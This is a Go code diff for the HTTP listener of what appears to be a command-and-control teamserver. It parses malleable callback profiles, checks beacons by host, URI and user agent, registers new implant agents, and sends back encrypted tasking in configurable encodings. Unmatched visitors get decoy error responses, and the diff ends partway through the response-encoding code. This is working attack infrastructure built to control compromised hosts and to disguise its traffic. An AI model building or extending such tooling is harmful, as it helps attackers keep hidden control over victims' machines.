@@ -3,30 +3,74 @@ package main
 import (
 	"bytes"
 	"crypto/rand"
-	"crypto/rsa"
-	"crypto/x509"
+	"encoding/base32"
 	"encoding/base64"
-	"encoding/json"
 	"encoding/hex"
-	"encoding/pem"
+	"encoding/json"
 	"errors"
 	"fmt"
-	"io"
-	"math/big"
-	"net/http"
+	// "strconv"
 	// "net/url"
+	"net/http"
 	"os"
 	"strings"
 	"time"
+	"io"
 
 	"github.com/gin-gonic/gin"
 	"golang.org/x/net/context"
 )
 
+// ==================== STRUCTS ====================
+
+type OutputConfig struct {
+	Mask      bool   
+	Header    string 
+	Format    string 
+	Parameter string 
+	Cookie    string
+	Body      string 
+
+	Append  string
+	Prepend string
+}
+
+type URIConfig struct {
+	ServerOutput *OutputConfig
+	ClientOutput *OutputConfig
+	ClientParams []map[string]interface{}
+}
+
+type ServerError struct {
+	Status   int   
+	Response string
+	Headers  map[string]string    
+}
+
+type HTTPMethod struct {
+	ServerHeaders map[string]string    
+	EmptyResponse []byte               
+	ClientHeaders map[string]string    
+	URI           map[string]URIConfig 
+}
+
+type Callback struct {
+	Hosts      	  []string 		
+	Host      	  string 	
+	UserAgent 	  string      	
+	SrvError      *ServerError 
+	Get       	  *HTTPMethod 
+	Post          *HTTPMethod 
+}
+
 type HTTPConfig struct {
-	HostBind           string `json:"host_bind"`
-	PortBind           int    `json:"port_bind"`
-	Callback_addresses string `json:"callback_addresses"`
+	HostBind   string `json:"host_bind"`
+	PortBind   int    `json:"port_bind"`
+
+	BlockUserAgent string `json:"block_user_agents"`
+	ProfileContent string `json:"uploaded_file"`
+
+	DomainRotation string `json:"domain_rotation_strategy"`
 
 	Ssl         bool   `json:"ssl"`
 	SslCert     []byte `json:"ssl_cert"`
@@ -34,23 +78,18 @@ type HTTPConfig struct {
 	SslCertPath string `json:"ssl_cert_path"`
 	SslKeyPath  string `json:"ssl_key_path"`
 
-	// agent
-	Uri 	       string `json:"uri"`
-	HttpMethod 	   string `json:"http_method"`
-	UserAgent 	   string `json:"user_agent"`
-	RequestHeaders string `json:"request_headers"`
+	// CryptKey []byte `json:"encrypt_key"`
 
-	ProxyUrl 	  string `json:"proxy_url"`
+	Protocol   string `json:"protocol"`
+	EncryptKey []byte `json:"encrypt_key"`
+
+	ProxyUrl      string `json:"proxy_url"`
 	ProxyUserName string `json:"proxy_user"`
 	ProxyPassword string `json:"proxy_pass"`
 
-	CryptKey [16]byte `json:"crypt_key"`
-
-	// server
-	ResponseHeaders map[string]string `json:"response_headers"`
-	Protocol   	    string 		      `json:"protocol"`
-	EncryptKey      []byte       	  `json:"encrypt_key"`
-	Server_headers  string 			  `json:"server_headers"`
+	Addresses 	string
+	MaskKey     []byte
+	Callbacks   []Callback
 }
 
 type HTTP struct {
@@ -61,95 +100,439 @@ type HTTP struct {
 	Active    bool
 }
 
-func (handler *HTTP) getKeyFromRequest(bodyBytes []byte) []byte {    
-    var key []byte
-
-    if len(bodyBytes) < 16 {
-        fmt.Printf("request body too small: expected at least 16 bytes, got %d", len(bodyBytes))
-		return nil
-    }
-
-	key = bodyBytes[len(bodyBytes)-16:]
-
-    var keyArray [16]byte
-    copy(keyArray[:], key)
-    handler.Config.CryptKey = keyArray
-
-	fmt.Printf("[INFO] Using key from last 16 bytes of request: %02x\n", keyArray)
-
-    return key
+type ServerRequest struct {
+	Headers		string
+	Body    	[]byte
+	EmptyResp	[]byte
+	Payload     []byte
 }
 
-func (handler *HTTP) ValidateConfig() error {
-    var missing []string
-    
-    if handler.Config.Uri == "" {
-        missing = append(missing, "Uri")
-    }
-    if handler.Config.HttpMethod == "" {
-        missing = append(missing, "HTTP Method")
-    }
-    if handler.Config.HostBind == "" {
-        missing = append(missing, "host bind")
-    }
-    if handler.Config.PortBind == 0 {
-        missing = append(missing, "port bind")
-    }
-    if handler.Config.Callback_addresses == "" {
-        missing = append(missing, "callback addresses")
-    }
-    
-    if len(missing) > 0 {
-        return fmt.Errorf("incomplete configuration. Missing required fields: %s", strings.Join(missing, ", "))
-    }
-    
-    return nil
+type ClientRequest struct {
+	Uri  		string
+	HttpMethod	string
+	Address     string
+	Params      map[string][]string
+	UserAgent   string
+	Body 		[]byte
+	Payload     []byte
+
+	Config      Callback
+
+	UriConfig       *URIConfig
+	HttpMethodCfg	*HTTPMethod
+}
+
+// convert_hex_escapes converts \xHH sequences to real bytes
+func convert_hex_escapes(input string) []byte {
+	var result []byte
+	i := 0
+
+	for i < len(input) {
+		if i < len(input)-3 && input[i] == '\\' && input[i+1] == 'x' {
+			// Try to convert \xHH
+			hexStr := input[i+2 : i+4]
+			if is_valid_hex(hexStr) {
+				// Convert hex to byte
+				byteVal, err := hex.DecodeString(hexStr)
+				if err == nil {
+					result = append(result, byteVal...)
+					i += 4
+					continue
+				}
+			}
+		}
+		// If not valid \xHH, add the character as is
+		result = append(result, input[i])
+		i++
+	}
+
+	return result
+}
+
+// checks if the string contains only valid hexadecimal characters
+func is_valid_hex(s string) bool {
+	if len(s) != 2 {
+		return false
+	}
+	for _, c := range s {
+		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
+			return false
+		}
+	}
+	return true
+}
+
+// checks if the string contains \xHH sequences
+func contains_hex_escapes(input string) bool {
+	for i := 0; i < len(input)-3; i++ {
+		if input[i] == '\\' && input[i+1] == 'x' && is_valid_hex(input[i+2:i+4]) {
+			return true
+		}
+	}
+	return false
+}
+
+func (handler *HTTP) parse_json_callback(profileContent string) []Callback {
+	var jsonData map[string]interface{}
+	json.Unmarshal([]byte(profileContent), &jsonData)
+
+	callbacksRaw := jsonData["callbacks"].([]interface{})
+	var callbacks []Callback
+	var addresses []string
+
+	for _, callbackItem := range callbacksRaw {
+		callbackMap := callbackItem.(map[string]interface{})
+
+		userAgent := callbackMap["user_agent"].(string)
+
+		var serverError *ServerError
+		if seRaw, ok := callbackMap["server_error"].(map[string]interface{}); ok {
+			response := ""
+			if resp, ok := seRaw["response"].(string); ok {
+				response = resp
+			}
+
+			fmt.Printf("[DEBUG] Error response: %s [%d]\n", response, int(seRaw["http_status"].(float64)))
+
+			headers := make(map[string]string)
+			if headersRaw, ok := seRaw["headers"].(map[string]interface{}); ok {
+				for key, value := range headersRaw {
+					if strValue, ok := value.(string); ok {
+						headers[key] = strValue
+					}
+				}
+			}
+
+			serverError = &ServerError{
+				Status:   int(seRaw["http_status"].(float64)),
+				Response: response,
+				Headers:  headers,
+			}
+		}
+
+		var getMethod *HTTPMethod
+		if getRaw, ok := callbackMap["get"].(map[string]interface{}); ok {
+			getMethod = parse_http_method(getRaw)
+		}
+
+		var postMethod *HTTPMethod
+		if postRaw, ok := callbackMap["post"].(map[string]interface{}); ok {
+			postMethod = parse_http_method(postRaw)
+		}
+
+		hostsRaw := callbackMap["hosts"].([]interface{})
+		var hosts []string
+		for _, host := range hostsRaw {
+			hosts = append(hosts, host.(string))
+		}
+
+		for _, host := range hosts {
+			addresses = append(addresses, host)
+
+			newCallback := Callback{
+				Hosts:     []string{host},
+				UserAgent: userAgent,
+				SrvError:  serverError,
+				Get:       getMethod,
+				Post:      postMethod,
+			}
+
+			callbacks = append(callbacks, newCallback)
+
+			// Print callback configuration
+			print_callback_config(len(callbacks)-1, newCallback)
+		}
+	}
+
+	handler.Config.Addresses = strings.Join(addresses, ",")
+
+	return callbacks
+}
+
+
+func parse_http_method(methodData map[string]interface{}) *HTTPMethod {
+	// Parse server headers
+	serverHeaders := make(map[string]string)
+	if shRaw, ok := methodData["server_headers"].(map[string]interface{}); ok {
+		for key, value := range shRaw {
+			serverHeaders[key] = value.(string)
+		}
+	}
+
+	// Parse client headers
+	clientHeaders := make(map[string]string)
+	if chRaw, ok := methodData["client_headers"].(map[string]interface{}); ok {
+		for key, value := range chRaw {
+			clientHeaders[key] = value.(string)
+		}
+	}
+
+	// Parse empty response
+	var emptyResponse []byte
+	if erRaw, ok := methodData["empty_response"].(string); ok {
+		if contains_hex_escapes(erRaw) {
+			fmt.Printf("[DEBUG] empty_response contains \\xHH sequences\n")
+			emptyResponse = convert_hex_escapes(erRaw)
+			fmt.Printf("[DEBUG] empty_response converted to bytes: %v\n", emptyResponse)
+		} else {
+			emptyResponse = []byte(erRaw)
+		}
+	}
+
+	uriConfigs := make(map[string]URIConfig)
+	if uriRaw, ok := methodData["uri"].(map[string]interface{}); ok {
+		for uriKey, uriData := range uriRaw {
+			uriMap := uriData.(map[string]interface{})
+
+			// Split routes BEFORE parsing configs
+			routes := strings.FieldsFunc(uriKey, func(r rune) bool {
+				return r == ' '
+			})
+
+			// For each route, create ONE INDEPENDENT copy of the configuration
+			for _, route := range routes {
+				route = strings.TrimSpace(route)
+				if route == "" {
+					continue
+				}
+
+				// IMPORTANT: Parse AGAIN for each route (don't reuse)
+				serverOutput := parse_output_config(uriMap["server_output"])
+				clientOutput := parse_output_config(uriMap["client_output"])
+
+				var clientParams []map[string]interface{}
+				if cpRaw, ok := uriMap["client_parameters"].([]interface{}); ok {
+					for _, cp := range cpRaw {
+						// Make deep copy of parameters
+						paramCopy := make(map[string]interface{})
+						paramMap := cp.(map[string]interface{})
+						for k, v := range paramMap {
+							paramCopy[k] = v
+						}
+						clientParams = append(clientParams, paramCopy)
+					}
+				}
+
+				uriConfigs[route] = URIConfig{
+					ServerOutput: serverOutput,
+					ClientOutput: clientOutput,
+					ClientParams: clientParams,
+				}
+			}
+		}
+	}
+
+	return &HTTPMethod{
+		ServerHeaders: serverHeaders,
+		ClientHeaders: clientHeaders,
+		EmptyResponse: emptyResponse,
+		URI:           uriConfigs,
+	}
+}
+
+func parse_output_config(outputData interface{}) *OutputConfig {
+	if outputData == nil {
+		return nil
+	}
+
+	outputMap := outputData.(map[string]interface{})
+	output := &OutputConfig{}
+
+	// Parse body
+	if body, ok := outputMap["body"].(string); ok {
+		if contains_hex_escapes(body) {
+			fmt.Printf("[DEBUG] body contains \\xHH sequences, converting...\n")
+			bodyBytes := convert_hex_escapes(body)
+			output.Body = string(bodyBytes)
+			fmt.Printf("[DEBUG] body converted to bytes: %v\n", bodyBytes)
+		} else {
+			output.Body = body
+		}
+	}
+
+	// Parse mask
+	if mask, ok := outputMap["mask"].(bool); ok {
+		output.Mask = mask
+	}
+
+	// Parse header
+	if header, ok := outputMap["header"].(string); ok {
+		if contains_hex_escapes(header) {
+			fmt.Printf("[DEBUG] header name contains \\xHH sequences: %s\n", header)
+			headerBytes := convert_hex_escapes(header)
+			fmt.Printf("[DEBUG] header converted to bytes: %v\n", headerBytes)
+		}
+		fmt.Printf("[DEBUG] header name: %s\n", header)
+		output.Header = header
+	}
+
+	// Parse format
+	if format, ok := outputMap["format"].(string); ok {
+		if contains_hex_escapes(format) {
+			fmt.Printf("[DEBUG] format contains \\xHH sequences: %s\n", format)
+			formatBytes := convert_hex_escapes(format)
+			fmt.Printf("[DEBUG] format converted to bytes: %v\n", formatBytes)
+		}
+		output.Format = format
+	}
+
+	// Parse parameter
+	if parameter, ok := outputMap["parameter"].(string); ok {
+		if contains_hex_escapes(parameter) {
+			fmt.Printf("[DEBUG] parameter contains \\xHH sequences: %s\n", parameter)
+			paramBytes := convert_hex_escapes(parameter)
+			fmt.Printf("[DEBUG] parameter converted to bytes: %v\n", paramBytes)
+		}
+		output.Parameter = parameter
+	}
+
+	// Parse cookie
+	if cookie, ok := outputMap["cookie"].(string); ok {
+		if contains_hex_escapes(cookie) {
+			fmt.Printf("[DEBUG] cookie contains \\xHH sequences: %s\n", cookie)
+			cookieBytes := convert_hex_escapes(cookie)
+			fmt.Printf("[DEBUG] cookie converted to bytes: %v\n", cookieBytes)
+		}
+		fmt.Printf("[DEBUG] cookie name: %s\n", cookie)
+		output.Cookie = cookie
+	}
+
+	// Parse append
+	if appendVal, ok := outputMap["append"].(string); ok {
+		if contains_hex_escapes(appendVal) {
+			fmt.Printf("[DEBUG] append contains \\xHH sequences\n")
+			appendBytes := convert_hex_escapes(appendVal)
+			output.Append = string(appendBytes)
+			fmt.Printf("[DEBUG] append converted to bytes: %v\n", appendBytes)
+		} else {
+			output.Append = appendVal
+		}
+	}
+
+	// Parse prepend
+	if prependVal, ok := outputMap["prepend"].(string); ok {
+		if contains_hex_escapes(prependVal) {
+			fmt.Printf("[DEBUG] prepend contains \\xHH sequences\n")
+			prependBytes := convert_hex_escapes(prependVal)
+			output.Prepend = string(prependBytes)
+			fmt.Printf("[DEBUG] prepend converted to bytes: %v\n", prependBytes)
+		} else {
+			output.Prepend = prependVal
+		}
+	}
+
+	return output
+}
+
+func print_callback_config(index int, cb Callback) {
+	fmt.Println("========================================")
+	fmt.Printf("Callback #%d Configuration\n", index+1)
+	fmt.Println("========================================")
+
+	fmt.Println("\n[Hosts]")
+	for i, host := range cb.Hosts {
+		fmt.Printf("  Host %d: %s\n", i+1, host)
+	}
+
+	fmt.Printf("\n[User Agent]\n  %s\n", cb.UserAgent)
+
+	if cb.SrvError != nil {
+		fmt.Println("\n[Server Error]")
+		fmt.Printf("  Status Code: %d\n", cb.SrvError.Status)
+		fmt.Printf("  Response: %s\n", cb.SrvError.Response)
+	}
+
+	if cb.Get != nil {
+		fmt.Println("\n[GET Method]")
+		print_http_method_config(cb.Get)
+	}
+
+	if cb.Post != nil {
+		fmt.Println("\n[POST Method]")
+		print_http_method_config(cb.Post)
+	}
+
+	fmt.Println("========================================\n")
+}
+
+func print_http_method_config(method *HTTPMethod) {
+	fmt.Println("  Server Headers:")
+	for key, value := range method.ServerHeaders {
+		fmt.Printf("    %s: %s\n", key, value)
+	}
+
+	fmt.Println("  Client Headers:")
+	for key, value := range method.ClientHeaders {
+		fmt.Printf("    %s: %s\n", key, value)
+	}
+
+	fmt.Printf("  Empty Response: %s\n", string(method.EmptyResponse))
+
+	fmt.Println("  URI Configurations:")
+	for uriPath, uriConfig := range method.URI {
+		fmt.Printf("    Path: %s\n", uriPath)
+
+		if uriConfig.ServerOutput != nil {
+			fmt.Println("      Server Output:")
+			print_output_config(uriConfig.ServerOutput, 8)
+		}
+
+		if uriConfig.ClientOutput != nil {
+			fmt.Println("      Client Output:")
+			print_output_config(uriConfig.ClientOutput, 8)
+		}
+
+		if len(uriConfig.ClientParams) > 0 {
+			fmt.Println("      Client Parameters:")
+			for j, param := range uriConfig.ClientParams {
+				fmt.Printf("        Param %d:\n", j+1)
+				for pkey, pval := range param {
+					fmt.Printf("          %s: %v\n", pkey, pval)
+				}
+			}
+		}
+	}
+}
+
+func print_output_config(output *OutputConfig, indent int) {
+	indentStr := strings.Repeat(" ", indent)
+
+	fmt.Printf("%sMask: %v\n", indentStr, output.Mask)
+	fmt.Printf("%sFormat: %s\n", indentStr, output.Format)
+	fmt.Printf("%sHeader: %s\n", indentStr, output.Header)
+	fmt.Printf("%sParameter: %s\n", indentStr, output.Parameter)
+	fmt.Printf("%sCookie: %s\n", indentStr, output.Cookie)
+	fmt.Printf("%sBody: %s\n", indentStr, output.Body)
+	fmt.Printf("%sPrepend: %s\n", indentStr, output.Prepend)
+	fmt.Printf("%sAppend: %s\n", indentStr, output.Append)
 }
 
 func (handler *HTTP) Start(ts Teamserver) error {
 	var err error = nil
 
 	cfg := handler.Config
-    fmt.Println("=== HTTP CONFIG ===")
-    fmt.Printf("HostBind: %s\n", cfg.HostBind)
-    fmt.Printf("PortBind: %d\n", cfg.PortBind)
-    fmt.Printf("Callback_addresses: %s\n", cfg.Callback_addresses)
-    
-    fmt.Printf("Ssl: %t\n", cfg.Ssl)
-    fmt.Printf("SslCert: %v (length: %d)\n", cfg.SslCert, len(cfg.SslCert))
-    fmt.Printf("SslKey: %v (length: %d)\n", cfg.SslKey, len(cfg.SslKey))
-    fmt.Printf("SslCertPath: %s\n", cfg.SslCertPath)
-    fmt.Printf("SslKeyPath: %s\n", cfg.SslKeyPath)
-    
-    fmt.Printf("Uri: %s\n", cfg.Uri)
-    fmt.Printf("HttpMethod: %s\n", cfg.HttpMethod)
-    fmt.Printf("UserAgent: %s\n", cfg.UserAgent)
-    fmt.Printf("RequestHeaders: %s\n", cfg.RequestHeaders)
-    
-    fmt.Printf("ProxyUrl: %s\n", cfg.ProxyUrl)
-    fmt.Printf("ProxyUserName: %s\n", cfg.ProxyUserName)
-    fmt.Printf("ProxyPassword: %s\n", cfg.ProxyPassword)
-    
-    fmt.Printf("ResponseHeaders: %v\n", cfg.ResponseHeaders)
-    fmt.Printf("Protocol: %s\n", cfg.Protocol)
-    fmt.Printf("Server_headers: %s\n", cfg.Server_headers)
-    fmt.Println("===================")
 
-	if err := handler.ValidateConfig(); err != nil {
-    	return err
+	if cfg.ProfileContent == "" {
+		return fmt.Errorf("profile content is empty - cannot parse callback configuration")
+	}
+
+	fileContent, err := base64.StdEncoding.DecodeString( cfg.ProfileContent )
+	fmt.Printf("callback file content %s\nlength: %d bytes\n", fileContent, len(fileContent))
+
+	handler.Config.Callbacks = handler.parse_json_callback( string( fileContent ) )
+	
+	fmt.Printf("[DEBUG] Parsed %d callbacks\n", len(handler.Config.Callbacks))
+
+	err = handler.validate_config_fmt(handler.Config) 
+	if err != nil {
+		return err
 	}
 
 	gin.SetMode(gin.ReleaseMode)
 	router := gin.New()
 
-	switch strings.ToUpper(cfg.HttpMethod) {
-	case "GET":
-		router.GET("/*endpoint", handler.processRequest)
-	case "POST":
-		router.POST("/*endpoint", handler.processRequest)
-	default:
-		router.POST("/*endpoint", handler.processRequest)
-	}
+	router.GET( "/*endpoint", handler.process_request)
+	router.POST("/*endpoint", handler.process_request)
 
 	handler.Active = true
 
@@ -171,10 +554,10 @@ func (handler *HTTP) Start(ts Teamserver) error {
 		}
 
 		handler.Config.SslCertPath = listenerPath + "/listener.crt"
-		handler.Config.SslKeyPath  = listenerPath + "/listener.key"
+		handler.Config.SslKeyPath = listenerPath + "/listener.key"
 
 		if len(handler.Config.SslCert) == 0 || len(handler.Config.SslKey) == 0 {
-			err = handler.generateSelfSignedCert(handler.Config.SslCertPath, handler.Config.SslKeyPath)
+			err = handler.gen_self_signed_cert(handler.Config.SslCertPath, handler.Config.SslKeyPath)
 			if err != nil {
 				handler.Active = false
 				fmt.Println("Error generating self-signed certificate:", err)
@@ -240,278 +623,456 @@ func (handler *HTTP) Stop() error {
 	return err
 }
 
-func (handler *HTTP) processRequest(ctx *gin.Context) {
+func (handler *HTTP) process_request(ctx *gin.Context) {
 	var (
-		ExternalIP   string
-		err          error
-		agentType    string
-		oldUID       []byte
-		oldAgentId   string
-		bodyData     []byte
-		responseData []byte
+		err            error
+		agentType      string
+		oldID          []byte
+		oldAgentID     string
+		agentExist     bool
+
+		agentData      []byte
+		responseData   []byte
+
+		key       []byte
+		crypt     *LokyCrypt
+		encrypted []byte
+
+		server ServerRequest
+		client ClientRequest
+
+		callbackByHost *Callback
+		callback       *Callback
+		serverOutput   *OutputConfig
+		clientOutput   *OutputConfig
+		uriConfig      *URIConfig
+		httpMethod     *HTTPMethod
+		srvError       *ServerError
 	)
 
-	currentPath := ctx.Request.URL.Path
-	valid := false
+	client.Uri        = ctx.Request.URL.Path
+	client.HttpMethod = ctx.Request.Method
+	client.Address    = ctx.Request.Host
+	client.UserAgent  = ctx.GetHeader("User-Agent")
+	client.Params     = ctx.Request.URL.Query()
 
-	if strings.TrimSpace(handler.Config.Uri) == "" {
-		fmt.Printf("[INFO] No URI filter configured, accepting all paths. Current path: %s\n", currentPath)
-		valid = true
-	} else {
-		uris := strings.Split(handler.Config.Uri, "\n")
-		fmt.Printf("[DEBUG] Configured URIs: %v\n", uris)
-		fmt.Printf("[DEBUG] Current path: %s\n", currentPath)
-		
-		for _, uri := range uris {
-			uri = strings.TrimSpace(uri)
-			if uri == "" {
-				continue
-			}
-			if !strings.HasPrefix(uri, "/") {
-				uri = "/" + uri
-			}
-			
-			if currentPath == uri {
-				valid = true
-				fmt.Printf("[DEBUG] Path matched URI: %s\n", uri)
-				break
-			}
-		}
-		
-		if !valid {
-			fmt.Printf("[WARN] Path '%s' not in allowed URIs\n", currentPath)
-		}
-	}
+	fmt.Printf("[DEBUG] Incoming request - URI: %s, Method: %s, UA: %s\n", client.Uri, client.HttpMethod, client.UserAgent)
 
-	if !valid {
-		fmt.Printf("[ERROR] Rejecting request to path: %s\n", currentPath)
-		
-		handler.applyServerHeaders(ctx)
-		
-		ctx.JSON(404, gin.H{"error": "not found"})
+	callbackByHost = handler.get_callback_by_host(client.Address)
+	if callbackByHost == nil {
+		fmt.Printf("[ERROR] No callback found for host: %s\n", client.Address)
+		ctx.Writer.Write([]byte("Bad Request"))
+		ctx.Status(http.StatusBadRequest)
 		return
 	}
 
-	fmt.Printf("[INFO] Processing valid request for path: %s from %s\n", currentPath, ctx.Request.RemoteAddr)
+	srvError = callbackByHost.SrvError
 
-	ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]
+	fmt.Printf("[DEBUG] Server error headers: %v\n", srvError.Headers)
 
-	agentType, oldUID, bodyData, err = handler.parseBeatAndData(ctx)
-	if err != nil {
-		fmt.Printf("[ERROR] Failed to parse beat and data: %v\n", err)
-		goto ERR
-	}
+	errorRet := func(valid bool, strError string) {
+		fmt.Printf("[ERROR] Rejecting request: %s\n", strError)
 
-	if len(oldUID) < 8 {
-		fmt.Println("[ERROR] oldUID too short")
-		goto ERR
-	}
-	oldAgentId = string(oldUID[:8])
-
-	// new agent
-	if !ModuleObject.ts.TsAgentIsExists( oldAgentId ) {
-		fmt.Printf("[INFO] Creating new agent: %s\n", oldAgentId)
-
-		keyOne    := handler.getKeyFromRequest(bodyData)
-		cryptOne  := NewLokyCrypt(keyOne, keyOne)
-		decrypted := cryptOne.Decrypt(bodyData)
-
-		agentData, err := ModuleObject.ts.TsAgentCreate(agentType, oldAgentId, decrypted, handler.Name, ExternalIP, true)
-		if err != nil {
-			fmt.Printf("[ERROR] Failed to create agent: %v\n", err)
-			goto ERR
-		}
-
-		randomId := make([]byte, 19)
-		_, _ = rand.Read( randomId )
-		newUID   := []byte( agentData.Id + hex.EncodeToString( randomId ) )
-
-		keyTwo    := handler.Config.CryptKey[:]
-		cryptTwo  := NewLokyCrypt(keyTwo, keyTwo)
-		encrypted := cryptTwo.Encrypt(newUID)
-
-		responseData = []byte(base64.StdEncoding.EncodeToString( append(oldUID, encrypted...) ) )
-
-	// existence agent
-	} else if len( bodyData ) > 0 {
-		fmt.Printf("[INFO] Processing data for existing agent: %s\n", oldAgentId)
-
-		_ = ModuleObject.ts.TsAgentSetTick( oldAgentId )
-
-		keyOne    := handler.Config.CryptKey[:]
-		cryptOne  := NewLokyCrypt(keyOne, keyOne)
-		decrypted := cryptOne.Decrypt(bodyData)
-
-		fmt.Printf("[INFO] key: %02x\n", keyOne)
-		fmt.Printf("[INFO] body data: %v\n", bodyData)
-		fmt.Printf("[INFO] decrypted: %v\n", decrypted)
-
-		if decrypted[0] == TASK_GET { 
-			hostedData, err := ModuleObject.ts.TsAgentGetHostedAll( oldAgentId, 0x12c0000 ) // 25 Mb * 0,75 for base64
-			if len(hostedData) > 0 {
-
-				key       := handler.Config.CryptKey[:]
-				crypt 	  := NewLokyCrypt(key, key)
-				encrypted := crypt.Encrypt(hostedData)
-
-				fmt.Printf("[INFO] response key: %02x\n", key)
-
-				responseData = []byte(base64.StdEncoding.EncodeToString( append(oldUID, encrypted...) ))
-				if err != nil {
-					goto ERR
-				}
-			}
-		} else if decrypted[0] == TASK_RESULT { 
-
-			_ = ModuleObject.ts.TsAgentProcessData(oldAgentId, decrypted[1:])
-
-		} else if decrypted[0] == MSG_QUICK || decrypted[0] == MSG_OUT { 
-
-			_ = ModuleObject.ts.TsAgentProcessData(oldAgentId, append([]byte{0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0}, decrypted...))
-
-		} else {
-			fmt.Printf("[WARN] Unknown body data type: %d\n", decrypted[0])
-		}
-	}
-
-	handler.applyServerHeaders(ctx)
-
-	if len(responseData) > 0 {
-		fmt.Printf("[INFO] Sending response (%d bytes) to agent: %s\n", len(responseData), oldAgentId)
-		_, err = ctx.Writer.Write(responseData)
-		if err != nil {
-			fmt.Printf("[ERROR] Failed to write response: %v\n", err)
-			return
-		}
-	} else {
-		fmt.Printf("[INFO] Sending empty response to agent: %s\n", oldAgentId)
-	}
-
-	ctx.AbortWithStatus(http.StatusOK)
-	return
-
-ERR:
-	fmt.Println("[ERROR] Request processing failed")
-	
-	handler.applyServerHeaders(ctx)
-	
-	ctx.AbortWithStatus(http.StatusInternalServerError)
-	return
-}
-
-func (handler *HTTP) applyServerHeaders(ctx *gin.Context) {
-	if handler.Config.ResponseHeaders != nil && len(handler.Config.ResponseHeaders) > 0 {
-		for key, value := range handler.Config.ResponseHeaders {
-			ctx.Header(key, value)
-		}
-	}
-
-	if handler.Config.Server_headers != "" {
-		lines := strings.Split(handler.Config.Server_headers, "\n")
-		for _, line := range lines {
-			line = strings.TrimSpace(line)
-			if line == "" {
-				continue
-			}
-
-			if strings.HasPrefix(line, "#") {
-				continue
-			}
-
-			parts := strings.SplitN(line, ":", 2)
-			if len(parts) == 2 {
-				key := strings.TrimSpace(parts[0])
-				value := strings.TrimSpace(parts[1])
-				
-				if key != "" && value != "" {
+		if srvError != nil {
+			if srvError.Headers != nil && len(srvError.Headers) > 0 {
+				for key, value := range srvError.Headers {
 					ctx.Header(key, value)
 				}
 			}
+
+			ctx.Status(srvError.Status)
+			ctx.Writer.Write([]byte(srvError.Response))
+		} else {
+			ctx.Writer.Write([]byte("Bad Request"))
+			ctx.Status(http.StatusBadRequest)
+		}
+
+		ctx.Abort()
+	}
+
+	fmt.Printf("[DEBUG] Looking for callback with URI: %s\n", client.Uri)
+	callback, uriConfig, httpMethod = handler.get_callback_by_uri(client.Uri, client.HttpMethod)
+	if callback == nil || uriConfig == nil || httpMethod == nil {
+		fmt.Printf("[DEBUG] No valid callback found for URI: %s and method: %s\n", client.Uri, client.HttpMethod)
+		fmt.Printf("[DEBUG] Available endpoints: %v\n", handler.get_all_endpoints())
+		errorRet(false, "no matching endpoint configuration")
+		return
+	}
+
+	fmt.Printf("[DEBUG] Found callback for URI: %s\n", client.Uri)
+
+	if client.UserAgent != callback.UserAgent {
+		fmt.Printf("[DEBUG] UserAgent mismatch - Expected: %s, Got: %s\n", callback.UserAgent, client.UserAgent)
+		errorRet(false, "invalid user agent")
+		return
+	}
+	fmt.Printf("[DEBUG] UserAgent validated\n")
+
+	if httpMethod.ClientHeaders != nil && len(httpMethod.ClientHeaders) > 0 {
+		for expectedHeader := range httpMethod.ClientHeaders {
+			if ctx.GetHeader(expectedHeader) == "" {
+				errorRet(false, fmt.Sprintf("Missing expected header: %s", expectedHeader))
+			}
 		}
 	}
+
+	fmt.Printf("[DEBUG] Headers validated\n")
+
+	clientOutput = uriConfig.ClientOutput
+	serverOutput = uriConfig.ServerOutput
+
+	if httpMethod != nil {
+		server.EmptyResp = httpMethod.EmptyResponse
+	}
+
+	fmt.Printf("[INFO] Processing valid request for path: %s from %s with method %s\n", client.Uri, client.Address, client.HttpMethod)
+
+	agentType, oldID, agentExist, err = handler.parse_client_data(ctx, &client, clientOutput)
+	if err != nil {
+		errorRet(false, fmt.Sprintf("failed to parse beat and data: %v", err))
+		return
+	}
+
+	agentData = client.Payload
+
+	// New agent
+	if !agentExist {
+		if len(oldID) < 8 {
+			errorRet(false, "oldID too short")
+			return
+		}
+
+		oldAgentID = string(oldID[:8])
+		fmt.Printf("[INFO] Creating new agent: %s\n", oldAgentID)
+
+		agentDataRes, err := ModuleObject.ts.TsAgentCreate(agentType, oldAgentID, client.Payload, handler.Name, client.Address, true)
+		if err != nil {
+			errorRet(false, fmt.Sprintf("failed to create agent: %v", err))
+			return
+		}
+
+		randomID := make([]byte, 19)
+		_, err = rand.Read(randomID)
+		if err != nil {
+			errorRet(false, fmt.Sprintf("failed to generate random ID: %v", err))
+			return
+		}
+
+		newID := []byte(agentDataRes.Id + hex.EncodeToString(randomID))
+
+		fmt.Printf("[DEBUG] New ID: %s\n", newID)
+		fmt.Printf("[DEBUG] Old ID: %s\n", oldID)
+
+		key 	  = handler.Config.EncryptKey
+		crypt 	  = NewLokyCrypt(key, key)
+		encrypted = crypt.Encrypt(newID)
+
+		combined := append(oldID, encrypted...)
+
+		switch serverOutput.Format {
+		case "hex":
+			responseData = []byte(hex.EncodeToString(combined))
+		case "base32":
+			responseData = []byte(base32.StdEncoding.EncodeToString(combined))
+		case "base64":
+			responseData = []byte(base64.StdEncoding.EncodeToString(combined))
+		case "base64url":
+			responseData = []byte(base64.URLEncoding.EncodeToString(combined))
+		case "raw":
+			responseData = combined
+		}
+
+		server.Payload = responseData
+
+	// Existing agent
+	} else if len(agentData) > 0 {
+		if len(oldID) >= 8 {
+			oldAgentID = string(oldID[:8])
+		} else {
+			oldAgentID = hex.EncodeToString(oldID)
+		}
+
+		fmt.Printf("[INFO] Processing data for existing agent id: %s\n", oldAgentID)
+
+		_ = ModuleObject.ts.TsAgentSetTick(oldAgentID)
+
+		if len(agentData) > 0 {
+			taskAction := agentData[0]
+
+			switch taskAction {
+			case TASK_GET:
+				hostedData, err := ModuleObject.ts.TsAgentGetHostedAll(oldAgentID, 0x12c0000)
+				if err != nil {
+					fmt.Printf("[ERROR] Failed to get hosted data: %v\n", err)
+				} else if len(hostedData) > 0 {
+					key = handler.Config.EncryptKey
+					crypt = NewLokyCrypt(key, key)
+					encrypted = crypt.Encrypt(hostedData)
+
+					combined := append(oldID, encrypted...)
+
+					switch serverOutput.Format {
+					case "hex":
+						responseData = []byte(hex.EncodeToString(combined))
+					case "base32":
+						responseData = []byte(base32.StdEncoding.EncodeToString(combined))
+					case "base64":
+						responseData = []byte(base64.StdEncoding.EncodeToString(combined))
+					case "base64url":
